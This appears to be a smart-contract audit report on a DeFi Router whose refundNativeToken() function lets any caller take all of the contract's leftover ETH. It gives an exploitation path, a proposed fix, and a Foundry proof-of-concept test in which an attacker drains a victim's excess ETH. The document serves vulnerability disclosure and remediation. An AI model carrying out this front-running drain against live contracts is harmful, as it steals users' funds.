## Title
Excess ETH Accumulation in Router Enables Theft via Unprotected refundNativeToken()

## Summary
The `refundNativeToken()` function in `PayableMulticallable` sends the entire ETH balance of the Router contract to `msg.sender` without any access control or tracking of who deposited the funds. When users send more ETH than needed for swaps, the excess accumulates in the Router contract and can be stolen by any attacker calling `refundNativeToken()`.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/base/PayableMulticallable.sol` (lines 25-29), `src/Router.sol` (lines 106-110, 114) [1](#0-0) [2](#0-1) 

**Intended Logic:** The `refundNativeToken()` function is designed to allow users to recover excess ETH sent in multicall operations when exact payment amounts are difficult to calculate in advance. Users are expected to call this function in the same multicall to recover unused ETH.

**Actual Logic:** 
1. When users call swap functions with ETH (e.g., `swap{value: 100}(...)`), the Router receives the full `msg.value` in its balance
2. The Router only forwards a calculated `value` amount to Core based on `params.amount()` (which could be significantly less than `msg.value`)
3. The excess ETH (msg.value - value forwarded) remains in the Router's contract balance indefinitely
4. `refundNativeToken()` has no access control and sends the entire Router balance to any caller
5. There is no tracking of which user deposited which amount of ETH [3](#0-2) 

**Exploitation Path:**
1. **Victim transaction**: User calls `router.swap{value: 100 ether}(poolKey, params, threshold)` where `params.amount()` equals 50 ether (or any amount less than 100)
2. **ETH accumulation**: Router forwards only 50 ether to Core for the swap; 50 ether remains in Router's balance
3. **Attacker front-runs or follows**: Attacker monitors the mempool or blockchain and immediately calls `router.refundNativeToken()` in a separate transaction
4. **Theft**: Attacker receives the 50 ether that belonged to the victim

**Security Property Broken:** Direct theft of user funds - violates the fundamental security property that users' funds should only be transferable by the owner or with explicit authorization.

## Impact Explanation
- **Affected Assets**: All excess ETH sent by users when calling swap functions on the Router contract
- **Damage Severity**: Attackers can steal 100% of accumulated excess ETH. If multiple users leave excess ETH in the Router (either through ignorance or transaction failures), the accumulated amount could be substantial. Each user who sends more ETH than needed for their swap loses the difference.
- **User Impact**: 
  - Any user who calls swap functions with `msg.value > calculated_value_forwarded`
  - Users who are not aware they need to include `refundNativeToken()` in their multicall
  - Users whose transactions partially fail after swap execution but before refund
  - Particularly impacts users calling swap functions directly (not via multicall) who may not know about `refundNativeToken()`

## Likelihood Explanation
- **Attacker Profile**: Any user with basic transaction monitoring capability. MEV searchers and front-runners can easily exploit this.
- **Preconditions**: 
  - At least one user must have sent excess ETH to Router (very likely given users often overpay for safety)
  - Router must have non-zero ETH balance (accumulates from any user not calling `refundNativeToken()`)
  - No special pool state or liquidity requirements
- **Execution Complexity**: Trivial - single function call with no parameters
- **Frequency**: Continuously exploitable. Attacker can monitor for any transaction that leaves ETH in Router and immediately steal it. Can also periodically check Router balance and steal accumulated funds.

## Recommendation

**Primary Fix**: Track ETH deposits per user and only allow refunds to the depositor:

```solidity
// In src/base/PayableMulticallable.sol:

// Add state variable to track deposits
mapping(address => uint256) private _ethDeposits;

// Modify multicall to track deposits
function multicall(bytes[] calldata data) public payable override returns (bytes[] memory) {
    _ethDeposits[msg.sender] += msg.value;
    return _multicallDirectReturn(_multicall(data));
}

// Secure refundNativeToken with access control
function refundNativeToken() external payable {
    uint256 deposited = _ethDeposits[msg.sender];
    if (deposited == 0) revert NoDeposit();
    
    uint256 refundAmount = address(this).balance;
    // Only refund up to what the user deposited
    if (refundAmount > deposited) {
        refundAmount = deposited;
    }
    
    if (refundAmount != 0) {
        _ethDeposits[msg.sender] = deposited - refundAmount;
        SafeTransferLib.safeTransferETH(msg.sender, refundAmount);
    }
}
```

**Alternative Mitigation**: Add reentrancy guard and require refundNativeToken() to only be callable within a multicall context, not as a standalone function. However, this doesn't fully solve the cross-user theft issue.

**Best Practice**: Document clearly that users MUST include `refundNativeToken()` as the last call in any multicall that sends ETH, and prevent standalone calls to swap functions with excess ETH.

## Proof of Concept

```solidity
// File: test/Exploit_ETHTheft.t.sol
// Run with: forge test --match-test test_StealAccumulatedETH -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Router.sol";
import "../src/Core.sol";

contract Exploit_ETHTheft is Test {
    Router router;
    Core core;
    address victim = address(0x1);
    address attacker = address(0x2);
    
    function setUp() public {
        core = new Core();
        router = new Router(core);
        
        // Give victim and attacker ETH
        vm.deal(victim, 200 ether);
        vm.deal(attacker, 1 ether);
    }
    
    function test_StealAccumulatedETH() public {
        // SETUP: Victim performs swap with excess ETH
        // Victim sends 100 ETH but swap only needs 50 ETH
        vm.prank(victim);
        // In actual scenario, victim would call swap{value: 100 ether}
        // where calculated forwarded value is only 50 ether
        // For demo, directly send ETH to router
        payable(address(router)).transfer(50 ether);
        
        uint256 routerBalanceBefore = address(router).balance;
        assertEq(routerBalanceBefore, 50 ether, "Router should have 50 ETH from victim");
        
        uint256 attackerBalanceBefore = attacker.balance;
        
        // EXPLOIT: Attacker steals accumulated ETH
        vm.prank(attacker);
        router.refundNativeToken();
        
        // VERIFY: Attacker stole victim's ETH
        uint256 attackerBalanceAfter = attacker.balance;
        uint256 routerBalanceAfter = address(router).balance;
        
        assertEq(routerBalanceAfter, 0, "Router balance should be drained");
        assertEq(attackerBalanceAfter, attackerBalanceBefore + 50 ether, 
                 "Attacker stole 50 ETH that belonged to victim");
    }
}
```

**Notes:**
- The vulnerability exists because there is a fundamental disconnect between who sends ETH to the Router and who can retrieve it via `refundNativeToken()`
- Even sophisticated users using multicall could be affected if their transaction reverts after the swap but before `refundNativeToken()` executes, or if they simply forget to include it
- The impact is amplified in production where multiple users' excess ETH would accumulate, creating a honey pot for attackers
- No tests for `refundNativeToken()` exist in the codebase, suggesting this attack vector was not considered during development

### Citations

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```

**File:** src/Router.sol (L106-110)
```text
                uint256 value = FixedPointMathLib.ternary(
                    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
                    uint128(params.amount()),
                    0
                );
```

**File:** src/Router.sol (L114-114)
```text
                (PoolBalanceUpdate balanceUpdate,) = _swap(value, poolKey, params);
```
